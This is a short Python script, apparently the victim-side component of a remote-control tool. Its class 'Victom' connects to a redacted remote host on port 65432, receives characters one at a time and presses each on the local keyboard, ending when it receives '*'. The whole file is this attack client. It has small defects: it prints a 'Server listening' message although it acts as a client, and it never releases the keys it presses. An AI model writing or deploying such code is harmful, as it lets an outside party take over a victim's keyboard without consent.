import socket
from pynput import mouse, keyboard
from pynput.keyboard import Key, Controller
import threading, queue


class Victom:
    def __init__(self):

        self.keyboard = Controller()

        HOST = '...'
        PORT = 65432

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as c:
            c.connect((HOST, PORT))

            print(f"Server listening on {HOST}:{PORT}")

            while True:
                response = c.recv(1).decode('utf-8')
                print(response)
                if response != '*':
                    self.keyboard.press(response)
                else:
                    break


if __name__ == "__main__":
    V = Victom()